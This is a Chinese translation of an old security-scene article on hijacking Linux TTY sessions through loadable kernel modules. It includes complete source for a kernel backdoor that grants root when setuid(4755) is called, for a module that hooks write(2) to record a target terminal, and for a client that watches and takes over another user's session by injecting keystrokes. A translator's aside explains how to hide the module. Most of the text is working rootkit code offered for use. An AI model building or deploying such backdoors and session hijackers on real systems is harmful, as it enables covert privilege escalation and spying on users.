---
title: "利用linux内核模块实现TTY hijacking"
date: 2001-03-29T00:00:00+08:00
tags: ["Security"]
draft: false
slug: "xfocus-article-142"
---

(quack_at_xfocus.org)

============================================

                         利用linux内核模块实现TTY hijacking

                           译：大鹰<e4gle@hackermail.com>

                   ============================================


简介

------------

   加载模块是linux中非常有用而又很重要的一项技术, 因为它可以使你在你需要的

时候加载设备的驱动程序。 然而, 也有它坏的一面: 它使内核hacking非常容易。

当你再也无法信任你的kernel的时候会发生些什么呢...?这篇文章的目的就是以简单的

思路来介绍内核模块的利用。


系统调用

------------

   系统调用，是一些可以被利用的底层函数, 他们在核心内部执行。在本文中, 它被利

用来让我们写一个非常简单的tty 截获/监控。所有的代码均在linux系统上面编写并测

试通过，并且不可以被编译运行倒其他系统上。好！让我们开始hacking kernel!


    TTY 截获, 就象tap和ttywatcher等程序是在Solaris,SunOS等其他带STREAMS系统中

很常见, 但是迄今为止在linux平台上就没有这么有用的tty hijacker(注: 我不考虑那种

基于pty的代码就象telnetsnoop程序那样的截获, 也不十分有用，因为你必须尽早准备监控

系统用户).


   因为现在的linux系统普遍缺乏STREAMS (LinSTREAMS似乎就要消失了),所以我们必须

选择一个方法来监控流（stream）。屏蔽击键的问题已经解决，因为我们可以利用TIOCSTI

这个ioctl调用宏来阻塞击键到标准输入流。 一个解决方案, 当然, 就是改变write(2)系

统调用到我们的代码，代码的作用是假如指向我们想要的tty就纪录下来; 我们可以在后面调用

真实的write(2)系统调用。


   很明显, 一个设备驱动会很好地工作。我们可以通过读这个设备来获得已经被纪录的数据,

并且增加一个或两个ioctl来告诉我们的代码确定我们想纪录的那个tty。


改变系统调用

---------------------------

   系统调用可以非常简单的就可以被改变成我自己的代码了。它的工作原理有点象dos系统

里的终端机制以及常驻代码。我们把原来的地址保存到一个变量, 然后设一个新的指针指向

我们的代码。在我们的代码里, 我们可以做一切事情, 当我们结束之后再调用原来的代码。

（译者注：这里是简单介绍了lkm的原理，但太过于简单了。）

   

   一个非常简单的例程就包含在hacked_setuid.c这个文件中, 是一个你可以安装的可加载

模块,并且当它被加载到内核运行时, 一个setuid(4755)将会设置你的uid/euid/gid/egid为0。

(参看附录里面提供的全部代码。)syscalls的地址信息都包含在sys_call_table这个数组里。

这就使我们改变syscalls指向我们自己的代码变的非常简单了。当我们这样做后，很多事情

都变得很简单了...


Linspy的注意事项

--------------------

   这个模块是非常容易被发现的， 所有你所做的都会通过cat /proc/modules来显示的很明

白。但这个问题很好解决，但我这里没有给出解决方法。（译者注：其实隐藏模块自身非常好

实现，把register_symtab(NULL)插入到init_module()函数块中即可限制符号输出于/proc/ksyms。） 

   用linspy的时候, 你需要创建一个ltap的设备, 主设备号设为40，次设备号为0。好，在这

之后, 运行make程序来insmod linspy这个设备。当它被加载后, 你可以这样运行：ltread [tty]，

假如模块运行的很好, 你可以发现已经把用户屏幕屏蔽输出了。


源代码 [use the included extract.c utility to unarchive the code]

---------------------------------------------------------------------


<++> linspy/Makefile

CONFIG_KERNELD=-DCONFIG_KERNELD

CFLAGS = -m486 -O6 -pipe -fomit-frame-pointer -Wall $(CONFIG_KERNELD)

CC=gcc

# this is the name of the device you have (or will) made with mknod

DN = '-DDEVICE_NAME="/dev/ltap"'

# 1.2.x need this to compile, comment out on 1.3+ kernels

V = #-DNEED_VERSION

MODCFLAGS := $(V) $(CFLAGS) -DMODULE -D__KERNEL__ -DLINUX


all:        linspy ltread setuid


linspy:        linspy.c /usr/include/linux/version.h

        $(CC) $(MODCFLAGS) -c linspy.c


ltread:        

        $(CC) $(DN) -o ltread ltread.c


clean:        

        rm *.o ltread


setuid:        hacked_setuid.c /usr/include/linux/version.h

        $(CC) $(MODCFLAGS) -c hacked_setuid.c

                                                     

<--> end Makefile

<++> linspy/hacked_setuid.c

int errno;

#include <linux/sched.h>

#include <linux/mm.h>

#include <linux/malloc.h>

#include <linux/errno.h>

#include <linux/sched.h>

#include <linux/kernel.h>

#include <linux/times.h>

#include <linux/utsname.h>

#include <linux/param.h>

#include <linux/resource.h>

#include <linux/signal.h>

#include <linux/string.h>

#include <linux/ptrace.h>

#include <linux/stat.h>

#include <linux/mman.h>

#include <linux/mm.h>

#include <asm/segment.h>

#include <asm/io.h>

#include <linux/module.h>

#include <linux/version.h>

#include <errno.h>

#include <linux/unistd.h>

#include <string.h>

#include <asm/string.h>

#include <sys/syscall.h>

#include <sys/types.h>

#include <sys/sysmacros.h>

#ifdef NEED_VERSION

static char kernel_version[] = UTS_RELEASE;

#endif

static inline _syscall1(int, setuid, uid_t, uid);/*用_syscall这个系统调用宏来构建setuid调用*/

extern void *sys_call_table[];/*调出系统调用表*/

void *original_setuid; /*原来的setuid*/

extern int hacked_setuid(uid_t uid)/*我们要替换的setuid*/

{

   int i;                     

   if(uid == 4755)

   {

      current->uid = current->euid = current->gid = current->egid = 0;

      /*使当前进程的uid,euid,gid,egid为零*/

      return 0;

   }

   sys_call_table[SYS_setuid] = original_setuid;/*保存原调用*/

   i = setuid(uid);

   sys_call_table[SYS_setuid] = hacked_setuid;/*替换调用！*/

   if(i == -1) return -errno;

   else return i;

}

int init_module(void)   /*加载*/

{

   original_setuid = sys_call_table[SYS_setuid];

   sys_call_table[SYS_setuid] = hacked_setuid;

   return 0;

}

void cleanup_module(void)   /*卸载*/

{

   sys_call_table[SYS_setuid] = original_setuid;

}  

<++> linspy/linspy.c

int errno;

#include <linux/tty.h>

#include <linux/sched.h>

#include <linux/mm.h>

#include <linux/malloc.h>

#include <linux/errno.h>

#include <linux/sched.h>

#include <linux/kernel.h>

#include <linux/times.h>

#include <linux/utsname.h>

#include <linux/param.h>

#include <linux/resource.h>

#include <linux/signal.h>

#include <linux/string.h>

#include <linux/ptrace.h>

#include <linux/stat.h>

#include <linux/mman.h>

#include <linux/mm.h>

#include <asm/segment.h>

#include <asm/io.h>

#ifdef MODULE

#include <linux/module.h>       

#include <linux/version.h>

#endif

#include <errno.h>

#include <asm/segment.h>

#include <linux/unistd.h>

#include <string.h>

#include <asm/string.h>

#include <sys/syscall.h>

#include <sys/types.h>

#include <sys/sysmacros.h>

#include <linux/vt.h>


/*设置版本信息，假如需要的话 */

#ifdef NEED_VERSION

static char kernel_version[] = UTS_RELEASE;

#endif


#ifndef MIN

#define MIN(a,b)        ((a) < (b) ? (a) : (b))

#endif


/* 定义缓冲信息 */        


#define BUFFERSZ        2048

char buffer[BUFFERSZ];

int queue_head = 0;

int queue_tail = 0;


/* taken_over 定义目标机是否可以看到任何输出 */

int taken_over = 0;


static inline _syscall3(int, write, int, fd, char *, buf, size_t, count);/*构建write调用*/

extern void *sys_call_table[];


/* linspy设备的设备信息 */

static int linspy_major = 40;

int tty_minor = -1;

int tty_major = 4;


/* 保存原write调用地址 */

void *original_write;


void save_write(char *, size_t);


int out_queue(void) 

{

   int c;

   if(queue_head == queue_tail) return -1;

   c = buffer[queue_head];

   queue_head++;

   if(queue_head == BUFFERSZ) queue_head=0;

   return c;

}


int in_queue(int ch)

{

   if((queue_tail + 1) == queue_head) return 0;

   buffer[queue_tail] = ch;

   queue_tail++;

   if(queue_tail == BUFFERSZ) queue_tail=0;

   return 1;

}


/* 检查tty是否是我们要寻找的 */

int is_fd_tty(int fd)

{

   struct file *f=NULL;

   struct inode *inode=NULL;

   int mymajor=0;

   int myminor=0;


   if(fd >= NR_OPEN || !(f=current->files->fd[fd]) || !(inode=f->f_inode))

      return 0;

   mymajor = major(inode->i_rdev);

   myminor = minor(inode->i_rdev);

   if(mymajor != tty_major) return 0;

   if(myminor != tty_minor) return 0;

   return 1;

}


/* 这是新的write调用 */

extern int new_write(int fd, char *buf, size_t count)

{

   int r;

   if(is_fd_tty(fd))

   {

      if(count > 0)

         save_write(buf, count);

      if(taken_over) return count;

   }

   sys_call_table[SYS_write] = original_write;   /*保存原调用*/

   r = write(fd, buf, count); 

   sys_call_table[SYS_write] = new_write;        /*替换新调用*/

   if(r == -1) return -errno;

   else return r;

}


/* 保存write调用的返回值到buffer */

void save_write(char *buf, size_t count)

{

   int i;

   for(i=0;i < count;i++)

      in_queue(get_fs_byte(buf+i));

}


/* 从ltap设备里读取- queue的返回数据 */

static int linspy_read(struct inode *in, struct file *fi, char *buf, int count)

{

   int i;

   int c;

   int cnt=0;

   if(current->euid != 0) return 0;

   for(i=0;i < count;i++)

   {

      c = out_queue();

      if(c < 0) break;

      cnt++;

      put_fs_byte(c, buf+i);

   }

   return cnt;

}


/* 打开ltap设备 */

static int linspy_open(struct inode *in, struct file *fi)

{

   if(current->euid != 0) return -EIO;

   MOD_INC_USE_COUNT;

   return 0;

}


/* 关闭ltap设备*/

static void linspy_close(struct inode *in, struct file *fi)

{

   taken_over=0;

   tty_minor = -1;

   MOD_DEC_USE_COUNT;

}

             

/* 一些ioctl操作 */

static int

linspy_ioctl(struct inode *in, struct file *fi, unsigned int cmd, unsigned long args)

{

#define LS_SETMAJOR     0

#define LS_SETMINOR     1

#define LS_FLUSHBUF     2

#define LS_TOGGLE       3


   if(current->euid != 0) return -EIO;

   switch(cmd)

   {

      case LS_SETMAJOR:

         tty_major = args;

         queue_head = 0;

         queue_tail = 0;

         break;

      case LS_SETMINOR:

         tty_minor = args;

         queue_head = 0;

         queue_tail = 0;

         break;

     case LS_FLUSHBUF:

         queue_head=0;

         queue_tail=0;

         break;

     case LS_TOGGLE:

         if(taken_over) taken_over=0;

         else taken_over=1;

         break;

      default:

         return 1;

   }

   return 0;

}


static struct file_operations linspy = {

NULL,

linspy_read,

NULL,

NULL,

NULL,

linspy_ioctl,

NULL, 

linspy_open,

linspy_close,

NULL

};


/* 加载模块 */

int init_module(void)

{

   original_write = sys_call_table[SYS_write];

   sys_call_table[SYS_write] = new_write;

   if(register_chrdev(linspy_major, "linspy", &linspy)) return -EIO;

   return 0;

}


/*卸载模块 */

void cleanup_module(void)

{

   sys_call_table[SYS_write] = original_write;

   unregister_chrdev(linspy_major, "linspy");

}

<--> end linspy.c

<++> linspy/ltread.c

#include <stdio.h>

#include <stdlib.h>

#include <unistd.h>

#include <termios.h>

#include <string.h>

#include <fcntl.h>

#include <signal.h>

#include <sys/types.h>

#include <sys/stat.h>

#include <sys/sysmacros.h>


struct termios save_termios;

int ttysavefd = -1;

int fd;


#ifndef DEVICE_NAME

#define DEVICE_NAME "/dev/ltap"

#endif


#define LS_SETMAJOR     0

#define LS_SETMINOR     1

 

#define LS_FLUSHBUF     2

#define LS_TOGGLE       3


void stuff_keystroke(int fd, char key)

{

   ioctl(fd, TIOCSTI, &key);

}


int tty_cbreak(int fd)

{

   struct termios buff;

   if(tcgetattr(fd, &save_termios) < 0)

      return -1;

   buff = save_termios;

   buff.c_lflag &= ~(ECHO | ICANON);

   buff.c_cc[VMIN] = 0;

   buff.c_cc[VTIME] = 0;

   if(tcsetattr(fd, TCSAFLUSH, &buff) < 0)

      return -1;

   ttysavefd = fd;

   return 0;

}


 char *get_device(char *basedevice)

{

   static char devname[1024];

   int fd;


   if(strlen(basedevice) > 128) return NULL;

   if(basedevice[0] == '/')

      strcpy(devname, basedevice);

   else

      sprintf(devname, "/dev/%s", basedevice);

   fd = open(devname, O_RDONLY);

   if(fd < 0) return NULL;

   if(!isatty(fd)) return NULL;

   close(fd);

   return devname;

}


int do_ioctl(char *device)

{

   struct stat mystat;


   if(stat(device, &mystat) < 0) return -1;

    fd = open(DEVICE_NAME, O_RDONLY);

   if(fd < 0) return -1;

   if(ioctl(fd, LS_SETMAJOR, major(mystat.st_rdev)) < 0) return -1;

   if(ioctl(fd, LS_SETMINOR, minor(mystat.st_rdev)) < 0) return -1;

}


void sigint_handler(int s)

{

   exit(s);

}


void cleanup_atexit(void)

{

   puts(" ");

   if(ttysavefd >= 0)

      tcsetattr(ttysavefd, TCSAFLUSH, &save_termios);

}


main(int argc, char **argv)

{

   int my_tty;

   char *devname;

    unsigned char ch;

   int i;


   if(argc != 2)

   {

      fprintf(stderr, "%s ttyname\n", argv[0]);

      fprintf(stderr, "ttyname should NOT be your current tty!\n");

      exit(0);

   }

   devname = get_device(argv[1]);

   if(devname == NULL)

   {

      perror("get_device");

      exit(0);

   }

   if(tty_cbreak(0) < 0)

   {

      perror("tty_cbreak");

      exit(0);

   }

   atexit(cleanup_atexit);

   signal(SIGINT, sigint_handler);

   if(do_ioctl(devname) < 0)

   {

      perror("do_ioctl");

      exit(0);

   }

   my_tty = open(devname, O_RDWR);

   if(my_tty == -1) exit(0);

   setvbuf(stdout, NULL, _IONBF, 0);

   printf("[now monitoring session]\n");

   while(1)

   {

      i = read(0, &ch, 1);

      if(i > 0)

      {

         if(ch == 24)

         {

            ioctl(fd, LS_TOGGLE, 0);

            printf("[Takeover mode toggled]\n");

         }

         else stuff_keystroke(my_tty, ch);

      }

      i = read(fd, &ch, 1);

      if(i > 0)

         putchar(ch);

    }

}

<--> end ltread.c


EOF


译者后话：这个代码看起来挺长，其实可以简单理解为通过指定某个TTY的major及minor值，来获取在它上面的所有输入输出，我们称为TTY hijacking。当然代码似乎很难懂，建议大家先了解lkm运作的基本原理，以及如何捕获一个系统调用，如何切换内核态和进程的用户态。


代码很多地方我给大家加了注释，希望有助于大家理解。
